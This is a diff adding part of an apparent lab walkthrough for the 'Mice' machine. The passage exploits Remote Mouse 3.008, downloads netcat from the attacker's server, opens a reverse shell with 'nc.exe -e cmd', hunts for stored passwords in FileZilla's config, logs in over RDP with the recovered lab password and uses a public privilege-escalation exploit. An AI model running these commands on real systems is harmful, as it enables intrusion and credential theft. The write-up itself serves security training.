@@ -73,3 +73,91 @@ https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
 
 ![](Images/Mice5.png)
 
+After downloading script, i served netcat via python server and then i tried to upload netcat to victim machine by running script.
+
+![](Images/Mice6.png)
+
+```sh
+python3 RemoteMouse-3.008-Exploit.py -t 192.168.104.199 -c 'powershell -c "curl http://192.168.45.189/nc.exe -o C:\Windows\Temp\nc.exe"'
+```
+
+![](Images/Mice7.png)
+
+I saw the script uploading netcat from my python server. To be able to get reverse shell i started my listener on 80 port and then i run netcat in victim machine via script.
+
+```sh
+python3 RemoteMouse-3.008-Exploit.py -t 192.168.104.199 -c 'C:\Windows\Temp\nc.exe 192.168.45.189 80 -e cmd'
+```
+
+And we received the shell.
+
+![](Images/Mice8.png)
+
+### Privilege Escalation
+
+First step, I noticed RDP is open. There could be some creds hiding around that have more privileges than this user has. But ran this first:
+
+```cmd
+whoami /all
+```
+
+![](Images/Mice9.png)
+
+![](Images/Mice10.png)
+
+**System Information**
+
+It is windows 10 pro and have hot fixes so there are least chances for any kernel exploit.
+
+![](Images/Mice11.png)
+
+**System Information**
+
+It is windows 10 pro and have hot fixes so there are least chances for any kernel exploit.
+
+![](Images/Mice12.png)
+
+I ran this command to check for any files that could contain password for administrator perhaps.
+
+```cmd
+findstr /SIM /C:"pass" *.ini *.cfg *.xml
+```
+
+![](Images/Mice13.png)
+
+We opened the file and found that we have password that is base64 encoded and it is for divine user but we have shell for divine user already. Let’s use this password to RDP into divine user. 
+
+```CMD
+more Users\divine\AppData\Roaming\FileZilla\recentservers.xml
+```
+
+![](Images/Mice14.png)
+
+![](Images/Mice15.png)
+
+`divine : ControlFreak11`
+
+```sh
+xfreerdp3 /v:192.168.104.199 /u:divine /p:'ControlFreak11' /cert:ignore /dynamic-resolution
+```
+
+![](Images/Mice16.png)
+
+We have already found public exploit for privilege escalation. Lets try.
+
+![](Images/Mice17.png)
+
+https://www.exploit-db.com/exploits/50047
+
+![](Images/Mice21.png)
+
+According to the steps:
+
+![](Images/Mice18.png)
+
+Now what you went to do is press enter, you don’t need to save it. But I saved it, restarted the service, and redid the attack mentioned above from the exploit database.
+
+![](Images/Mice20.png)
+
+
+![](Images/Mice19.png)
